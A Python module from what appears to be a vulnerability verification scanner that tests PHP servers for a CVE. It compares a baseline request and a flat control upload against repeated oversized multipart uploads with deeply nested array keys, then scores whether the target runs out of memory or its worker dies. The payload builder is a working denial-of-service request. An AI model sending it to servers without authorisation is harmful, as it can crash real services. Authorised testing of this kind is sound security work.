from __future__ import annotations
import re
import secrets

from .models import Evidence, Finding, Target, Verdict
from .fingerprint import session
from .audit import Audit

OOM = re.compile(r"Allowed memory size of (\d+) bytes exhausted")


def _key(levels: int) -> str:
    return "a" + "[][a]" * levels


def _body(marker: str, mib: int, levels: int):
    b = "----dw" + secrets.token_hex(10)
    filler = "A" * (mib * 1024 * 1024)
    parts = [
        f"--{b}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n{marker}\r\n",
        f"--{b}\r\nContent-Disposition: form-data; name=\"{_key(levels)}\"\r\n\r\n{filler}\r\n",
        f"--{b}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"{marker}.txt\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n{filler[:512]}\r\n",
        f"--{b}--\r\n",
    ]
    return "".join(parts).encode(), f"multipart/form-data; boundary={b}"


def _post(t, mib, levels, timeout, marker):
    body, ctype = _body(marker, mib, levels)
    return session().post(t.url + "/", data=body,
                          headers={"Content-Type": ctype}, timeout=timeout)


def _benign(t, timeout):
    return session().get(t.url + "/", timeout=timeout)


def _control(t, timeout, marker):
    b = "----dw" + secrets.token_hex(8)
    body = (
        f"--{b}\r\nContent-Disposition: form-data; name=\"c1\"\r\n\r\n{marker}\r\n"
        f"--{b}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"{marker}.txt\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\nDW\r\n--{b}--\r\n"
    ).encode()
    return session().post(t.url + "/", data=body, timeout=timeout,
                          headers={"Content-Type": f"multipart/form-data; boundary={b}"})


def _crashed(status, content, text):
    return (bool(OOM.search(text)) or status in (502, 503, 504)
            or (status == 500 and len(content) < 512))


def verify(t, cves, reps, mib, levels, timeout, audit):
    if not cves:
        return None
    f = Finding(cve=cves[0]["cve"], severity=cves[0]["sev"],
                verdict=Verdict.PATCHED, remediation=cves[0]["remediation"])

    try:
        base = _benign(t, timeout)
    except Exception as e:
        f.evidence.append(Evidence("A_baseline", "transport", type(e).__name__))
        f.verdict = Verdict.UNREACHABLE
        return f
    base_ok = base.status_code < 500
    f.evidence.append(Evidence("A_baseline", "status", "Baseline",
                               status=base.status_code, bytes=len(base.content)))

    control_crashed = True
    try:
        c = _control(t, timeout, "dw" + secrets.token_hex(4))
        control_crashed = _crashed(c.status_code, c.content, c.text[:4000])
        f.evidence.append(Evidence("B_control", "probe", "flaches Multipart",
                                   status=c.status_code, bytes=len(c.content)))
    except Exception as e:
        f.evidence.append(Evidence("B_control", "transport", type(e).__name__))

    hits = 0
    for i in range(reps):
        marker = "dw" + secrets.token_hex(4)
        try:
            r = _post(t, mib, levels, timeout, marker)
        except Exception as e:
            f.evidence.append(Evidence("C_treatment", "transport",
                                       type(e).__name__, marker=marker))
            hits += 1
            continue
        hits += _crashed(r.status_code, r.content, r.text[:8000])
        f.evidence.append(Evidence("C_treatment", "probe", f"Versuch {i+1}",
                                   status=r.status_code, bytes=len(r.content),
                                   marker=marker if marker in r.text else None))

    alive = True
    try:
        after = _benign(t, timeout)
        alive = after.status_code < 500
        f.evidence.append(Evidence("D_after", "status", "Nachlauf", status=after.status_code))
    except Exception as e:
        alive = False
        f.evidence.append(Evidence("D_after", "transport", type(e).__name__))

    ratio = hits / max(reps, 1)
    differential = hits > 0 and not control_crashed
    worker_died = base_ok and not alive

    if differential and ratio >= 0.66 and worker_died:
        f.verdict, f.confidence = Verdict.CONFIRMED, min(0.95, 0.55 + 0.3 * ratio + 0.15)
    elif differential and ratio >= 0.66:
        f.verdict, f.confidence = Verdict.CONFIRMED, 0.6
    elif hits and differential:
        f.verdict, f.confidence = Verdict.LIKELY, 0.3 + 0.3 * ratio
    elif hits and control_crashed:
        f.verdict, f.confidence = Verdict.LIKELY, 0.2 + 0.2 * ratio
    else:
        f.verdict = Verdict.PATCHED
        f.confidence = 0.75 if alive and base_ok else 0.35

    f.evidence.append(Evidence(
        "E_verdict", "score",
        f"treatment={hits}/{reps} control={'crash' if control_crashed else 'ok'} "
        f"worker={'tot' if not alive else 'lebt'} diff={differential} "
        f"konfidenz={f.confidence:.2f}"))
    audit.write("verify", f.verdict.value, t.url, cve=f.cve, hits=hits, reps=reps,
                control_crashed=control_crashed, confidence=f.confidence)
    return f
